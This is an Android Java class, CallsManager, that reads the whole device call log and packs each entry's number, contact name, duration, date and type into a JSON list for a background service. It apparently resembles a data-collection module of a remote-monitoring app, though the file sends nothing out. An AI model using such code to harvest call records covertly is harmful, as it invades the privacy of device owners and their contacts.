package br.com.assessoriarealeza.irp;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {

    public static JSONObject getCallsLogs() {
        JSONObject calls = new JSONObject();
        JSONArray list = new JSONArray();

        Context context = MainService.getContextOfApplication();

        Uri allCallsUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.TYPE
        };
        String selection = null;
        String[] selectionArgs = null;
        String sortOrder = CallLog.Calls.DATE + " DESC";

        Cursor cursor = context.getContentResolver().query(
                allCallsUri,
                projection,
                selection,
                selectionArgs,
                sortOrder
        );

        if (cursor == null) {
            return null;
        }

        while (cursor.moveToNext()) {
            try {
                JSONObject call = new JSONObject();
                String phoneNo = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                call.put("phoneNo", phoneNo);
                call.put("name", name);
                call.put("duration", duration);
                call.put("date", date);
                call.put("type", type);

                list.put(call);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        cursor.close();

        try {
            calls.put("callsList", list);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return calls;
    }

}
